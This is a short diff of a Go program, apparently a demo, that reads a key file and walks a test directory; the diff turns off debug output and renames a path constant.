@@ -9,11 +9,11 @@ import (
 	"path/filepath"
 )
 
-const DEBUG bool = true
+const DEBUG bool = false
 
 var file_paths []string
 
-const root string = "/home/kali/Documents/GoDemo2/test"
+const ROOT string = "/home/kali/Documents/GoDemo2/test"
 
 func main() {
 	key := readFile("../key.txt")
@@ -21,7 +21,7 @@ func main() {
 	if DEBUG {
 		fmt.Println("Key: ", []byte(key))
 	}
-	err := filepath.WalkDir(root, visitFile)
+	err := filepath.WalkDir(ROOT, visitFile)
 	if err != nil {
 		panic(err)
 	}
